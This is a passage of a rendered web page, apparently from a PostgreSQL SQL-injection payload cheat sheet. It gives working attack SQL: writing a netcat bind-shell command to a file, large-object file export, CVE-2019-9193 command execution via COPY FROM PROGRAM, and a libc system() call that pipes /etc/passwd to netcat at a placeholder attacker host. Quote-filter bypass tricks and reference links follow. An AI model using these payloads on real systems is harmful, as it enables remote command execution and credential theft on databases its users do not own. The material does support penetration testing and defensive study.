+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="k">COPY</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;nc -lvvp 2346 -e /bin/bash&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="s1">&#39;/tmp/pentestlab&#39;</span><span class="p">;</span>
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">lo_from_bytea</span><span class="p">(</span><span class="mi">43210</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;your file data goes in here&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">-- create a large object with OID 43210 and some data</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">lo_put</span><span class="p">(</span><span class="mi">43210</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;some other data&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">-- append data to a large object at offset 20</span>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">lo_export</span><span class="p">(</span><span class="mi">43210</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/tmp/testexport&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">-- export data to /tmp/testexport</span>
+</code></pre></div>
+<h2 id="postgresql-command-execution">PostgreSQL Command execution</h2>
+<h3 id="cve-20199193">CVE-2019–9193</h3>
+<p>Can be used from <a href="https://github.com/rapid7/metasploit-framework/pull/11598">Metasploit</a> if you have a direct access to the database, otherwise you need to execute manually the following SQL queries. </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="k">DROP</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="k">IF</span><span class="w"> </span><span class="k">EXISTS</span><span class="w"> </span><span class="n">cmd_exec</span><span class="p">;</span><span class="w">          </span><span class="c1">-- [Optional] Drop the table you want to use if it already exists</span>
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">cmd_exec</span><span class="p">(</span><span class="n">cmd_output</span><span class="w"> </span><span class="nb">text</span><span class="p">);</span><span class="w"> </span><span class="c1">-- Create the table you want to hold the command output</span>
+<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="k">COPY</span><span class="w"> </span><span class="n">cmd_exec</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">PROGRAM</span><span class="w"> </span><span class="s1">&#39;id&#39;</span><span class="p">;</span><span class="w">        </span><span class="c1">-- Run the system command via the COPY FROM PROGRAM function</span>
+<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">cmd_exec</span><span class="p">;</span><span class="w">                 </span><span class="c1">-- [Optional] View the results</span>
+<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="k">DROP</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="k">IF</span><span class="w"> </span><span class="k">EXISTS</span><span class="w"> </span><span class="n">cmd_exec</span><span class="p">;</span><span class="w">          </span><span class="c1">-- [Optional] Remove the table</span>
+</code></pre></div>
+<p><img alt="https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png" src="https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png" /></p>
+<h3 id="using-libcso6">Using libc.so.6</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="k">REPLACE</span><span class="w"> </span><span class="k">FUNCTION</span><span class="w"> </span><span class="k">system</span><span class="p">(</span><span class="n">cstring</span><span class="p">)</span><span class="w"> </span><span class="k">RETURNS</span><span class="w"> </span><span class="nb">int</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;system&#39;</span><span class="w"> </span><span class="k">LANGUAGE</span><span class="w"> </span><span class="s1">&#39;c&#39;</span><span class="w"> </span><span class="k">STRICT</span><span class="p">;</span>
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">system</span><span class="p">(</span><span class="s1">&#39;cat /etc/passwd | nc &lt;attacker IP&gt; &lt;attacker port&gt;&#39;</span><span class="p">);</span>
+</code></pre></div>
+<h3 id="bypass-filter">Bypass Filter</h3>
+<h4 id="quotes">Quotes</h4>
+<p>Using CHR</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">CHR</span><span class="p">(</span><span class="mi">65</span><span class="p">)</span><span class="o">||</span><span class="n">CHR</span><span class="p">(</span><span class="mi">66</span><span class="p">)</span><span class="o">||</span><span class="n">CHR</span><span class="p">(</span><span class="mi">67</span><span class="p">);</span>
+</code></pre></div>
+<p>Using Dollar-signs  ( &gt;= version 8 PostgreSQL)</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="err">$$</span><span class="n">This</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">string$$</span>
+<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="err">$</span><span class="n">TAG$This</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">another</span><span class="w"> </span><span class="n">string$TAG$</span>
+</code></pre></div>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9">A Penetration Tester’s Guide to PostgreSQL - David Hayter</a></li>
+<li><a href="https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5">Authenticated Arbitrary Command Execution on PostgreSQL 9.3 &gt; Latest - Mar 20 2019 - GreenWolf</a></li>
+<li><a href="https://hackerone.com/reports/181803">SQL Injection /webApp/oma_conf ctx parameter (viestinta.lahitapiola.fi) - December 8, 2016 - Sergey Bobrov (bobrov)</a></li>
+<li><a href="https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/">POSTGRESQL 9.X REMOTE COMMAND EXECUTION - 26 Oct 17 - Daniel</a></li>
+<li><a href="https://pulsesecurity.co.nz/articles/postgres-sqli">SQL Injection and Postgres - An Adventure to Eventual RCE - May 05, 2020 - Denis Andzakovic</a></li>
+<li><a href="https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf">Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - 2009 - INFIGO</a></li>
+</ul>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      Last update:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">January 4, 2023</span>
+      
+    
+  </small>
+</div>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "navigation.tracking", "navigation.top"], "search": "../../assets/javascripts/workers/search.74e28a9f.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.220ee61c.min.js"></script>
+      
+    
+  </body>
+</html>
